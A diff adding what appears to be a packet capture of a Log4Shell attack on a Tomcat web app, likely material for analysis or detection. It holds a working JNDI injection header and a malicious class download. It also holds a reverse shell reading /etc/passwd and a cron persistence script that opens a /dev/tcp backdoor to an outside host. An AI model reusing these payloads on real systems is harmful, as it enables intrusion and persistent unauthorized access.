@@ -1,0 +1,234 @@
+--- Packet #1 at 2024-01-15 14:23:41.052 UTC ---
+Source: 198.51.100.25:54892 -> Destination: 10.0.1.50:8080
+Protocol: HTTP
+POST /api/user/login HTTP/1.1
+Host: vulnerable-app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: application/json
+Content-Type: application/json
+X-Api-Version: ${jndi:ldap://203.0.113.45:1389/ExploitPayload}
+Content-Length: 58
+
+{"username":"admin","password":"test123"}
+
+--- Packet #2 at 2024-01-15 14:23:41.089 UTC ---
+Source: 10.0.1.50:8080 -> Destination: 198.51.100.25:54892
+Protocol: HTTP
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Type: application/json
+Content-Length: 45
+
+{"status":"processing","session":"temp_init"}
+
+--- Packet #3 at 2024-01-15 14:23:41.124 UTC ---
+Source: 10.0.1.50:42318 -> Destination: 203.0.113.45:1389
+Protocol: LDAP
+LDAP Bind Request
+Message ID: 1
+Version: 3
+Authentication: simple
+Distinguished Name: (empty)
+
+--- Packet #4 at 2024-01-15 14:23:41.156 UTC ---
+Source: 203.0.113.45:1389 -> Destination: 10.0.1.50:42318
+Protocol: LDAP
+LDAP Bind Response
+Message ID: 1
+Result Code: success (0)
+Matched DN: (empty)
+Error Message: (empty)
+
+--- Packet #5 at 2024-01-15 14:23:41.189 UTC ---
+Source: 10.0.1.50:42318 -> Destination: 203.0.113.45:1389
+Protocol: LDAP
+LDAP Search Request
+Message ID: 2
+Base Object: ExploitPayload
+Scope: baseObject (0)
+Deref Aliases: neverDerefAliases (0)
+Size Limit: 0
+Time Limit: 0
+Attributes Only: False
+Filter: (objectClass=*)
+Attributes:
+  javaClassName
+  javaCodeBase
+  objectClass
+  javaFactory
+
+--- Packet #6 at 2024-01-15 14:23:41.223 UTC ---
+Source: 203.0.113.45:1389 -> Destination: 10.0.1.50:42318
+Protocol: LDAP
+LDAP Search Result Entry
+Message ID: 2
+Distinguished Name: cn=ExploitPayload,dc=exploit,dc=local
+Attributes:
+  javaClassName: com.malicious.RemoteCodeExecutor
+  javaCodeBase: http://203.0.113.45:8000/
+  objectClass: javaNamingReference
+  javaFactory: com.malicious.RemoteCodeExecutor
+
+--- Packet #7 at 2024-01-15 14:23:41.241 UTC ---
+Source: 203.0.113.45:1389 -> Destination: 10.0.1.50:42318
+Protocol: LDAP
+LDAP Search Result Done
+Message ID: 2
+Result Code: success (0)
+Matched DN: (empty)
+Error Message: (empty)
+
+--- Packet #8 at 2024-01-15 14:23:41.298 UTC ---
+Source: 10.0.1.50:42319 -> Destination: 203.0.113.45:8000
+Protocol: HTTP
+GET /com/malicious/RemoteCodeExecutor.class HTTP/1.1
+Host: 203.0.113.45:8000
+User-Agent: Java/1.8.0_181
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+--- Packet #9 at 2024-01-15 14:23:41.334 UTC ---
+Source: 203.0.113.45:8000 -> Destination: 10.0.1.50:42319
+Protocol: HTTP
+HTTP/1.1 200 OK
+Server: SimpleHTTP/0.6 Python/3.8.10
+Date: Mon, 15 Jan 2024 14:23:41 GMT
+Content-Type: application/octet-stream
+Content-Length: 2847
+Last-Modified: Mon, 15 Jan 2024 13:45:22 GMT
+
+CAFEBABE0000003400F90A002E00620A006300640A006500660A006700680A00
+69006A0A006B006C08006D0A006E006F0A007000710A007200730A00740075
+[Java bytecode continues...]
+
+--- Packet #10 at 2024-01-15 14:23:41.389 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP SYN
+Sequence Number: 2847293847
+Window Size: 64240
+MSS: 1460
+
+--- Packet #11 at 2024-01-15 14:23:41.421 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP SYN-ACK
+Sequence Number: 1928374650
+Acknowledgment Number: 2847293848
+Window Size: 65535
+
+--- Packet #12 at 2024-01-15 14:23:41.423 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP ACK
+Acknowledgment Number: 1928374651
+
+--- Packet #13 at 2024-01-15 14:23:41.456 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): id; uname -a; whoami
+
+--- Packet #14 at 2024-01-15 14:23:41.492 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP Data
+Payload (decoded): uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+Linux webapp-server 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux
+tomcat
+
+--- Packet #15 at 2024-01-15 14:23:41.634 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): cat /etc/passwd
+
+--- Packet #16 at 2024-01-15 14:23:41.678 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP Data
+Payload (decoded): root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[additional passwd entries...]
+tomcat:x:1001:1001:Apache Tomcat:/opt/tomcat:/bin/bash
+
+--- Packet #17 at 2024-01-15 14:23:42.145 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): ls -la /opt/tomcat/webapps
+
+--- Packet #18 at 2024-01-15 14:23:42.189 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP Data
+Payload (decoded): total 24
+drwxr-xr-x 6 tomcat tomcat 4096 Jan 15 10:15 .
+drwxr-xr-x 9 tomcat tomcat 4096 Jan 14 16:22 ..
+drwxr-xr-x 3 tomcat tomcat 4096 Jan 15 10:15 ROOT
+drwxr-xr-x 5 tomcat tomcat 4096 Jan 15 10:15 vulnerable-app
+
+--- Packet #19 at 2024-01-15 14:23:43.234 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): curl -O http://203.0.113.45:8000/persistence.sh
+
+--- Packet #20 at 2024-01-15 14:23:43.567 UTC ---
+Source: 10.0.1.50:42321 -> Destination: 203.0.113.45:8000
+Protocol: HTTP
+GET /persistence.sh HTTP/1.1
+Host: 203.0.113.45:8000
+User-Agent: curl/7.68.0
+Accept: */*
+
+--- Packet #21 at 2024-01-15 14:23:43.612 UTC ---
+Source: 203.0.113.45:8000 -> Destination: 10.0.1.50:42321
+Protocol: HTTP
+HTTP/1.1 200 OK
+Server: SimpleHTTP/0.6 Python/3.8.10
+Date: Mon, 15 Jan 2024 14:23:43 GMT
+Content-Type: application/x-sh
+Content-Length: 438
+
+#!/bin/bash
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/backdoor.sh") | crontab -
+mkdir -p /tmp/.hidden
+cat > /tmp/.hidden/backdoor.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
+EOF
+chmod +x /tmp/.hidden/backdoor.sh
+
+--- Packet #22 at 2024-01-15 14:23:44.089 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): bash persistence.sh
+
+--- Packet #23 at 2024-01-15 14:23:44.223 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP Data
+Payload (decoded): [Persistence installed successfully]
+
+--- Packet #24 at 2024-01-15 14:23:45.156 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP Data
+Payload (decoded): exit
+
+--- Packet #25 at 2024-01-15 14:23:45.189 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP FIN-ACK
+
+--- Packet #26 at 2024-01-15 14:23:45.223 UTC ---
+Source: 203.0.113.45:4444 -> Destination: 10.0.1.50:42320
+Protocol: TCP
+TCP FIN-ACK
+
+--- Packet #27 at 2024-01-15 14:23:45.225 UTC ---
+Source: 10.0.1.50:42320 -> Destination: 203.0.113.45:4444
+Protocol: TCP
+TCP ACK
